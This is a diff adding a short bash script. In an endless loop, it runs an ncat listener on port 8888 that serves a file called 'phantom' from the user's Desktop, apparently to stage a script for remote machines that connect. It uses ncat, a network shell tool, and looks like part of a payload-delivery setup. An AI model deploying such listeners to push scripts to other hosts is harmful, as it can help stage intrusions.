@@ -1,0 +1,7 @@
+#!/bin/bash
+
+#change this according to the listening ncat ip and the location of the phantom script
+
+while true; do
+	ncat -v -l -p 8888 </home/$USER/Desktop/phantom	
+done
